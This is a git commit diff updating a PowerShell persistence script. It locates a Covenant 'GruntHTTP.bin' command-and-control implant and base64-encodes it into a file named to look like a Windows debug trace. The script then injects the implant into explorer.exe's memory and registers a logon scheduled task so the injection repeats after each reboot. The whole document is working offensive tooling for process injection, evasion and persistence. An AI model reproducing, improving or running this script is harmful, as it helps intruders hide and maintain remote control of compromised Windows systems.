5e1f76e917c4b7bfde81665f35f298006f8ce068
megatop1 <43348736+megatop1@users.noreply.github.com>
2022-01-18 23:19:12 -0500

    Update InjectPayloadtoMemoryOnboot.ps1

--- Windows/Persistence/InjectPayloadtoMemoryOnboot.ps1
+++ Windows/Persistence/InjectPayloadtoMemoryOnboot.ps1
@@ -1,15 +1,15 @@
 # Get PID of first occurence of explorer.exe
 $procid=(get-process explorer).id | Select-Object -First 1
 
-# Fomd the path of processinjection.exe
-$file Get-ChildItem -path C:\ -Filter ProcessInjection.exe -Recurse | %{$_.FullName}
+# Find the absolute path to processinjection.exe and store in variable
+$file = Get-ChildItem -path C:\ -Filter ProcessInjection.exe -Recurse | %{$_.FullName}
 
 # Create .txt payload
-$filename = "C:\Users\Administrator\Downloads\GruntHTTP.bin"
-[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | Out-File C:\Users\Downloads\covenant.txt
+$filename = Get-ChildItem -path C:\ -Filter GruntHTTP.bin -Recurse | %{$_.FullName}
+[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | Out-File C:\Windows\debug\wiatrace.txt
 
 # Inject Payload into Memory
-$file /pid:$procid /path:C:\Users\Administrator\Downloads\covenant.txt /f:base64 /t:1
+$file /pid:$procid /path:C:\Windows\debug\wiatrace.txt /t:1
 
 # Ensure this script runs on boot with a scheduled task. Note system32 is where this script is located
 schtasks /create /tn "MyCustomTask" /sc onlogon /tr "start /B C:\Windows\System32\InjectPayloadtoMemoryOnboot.ps1"
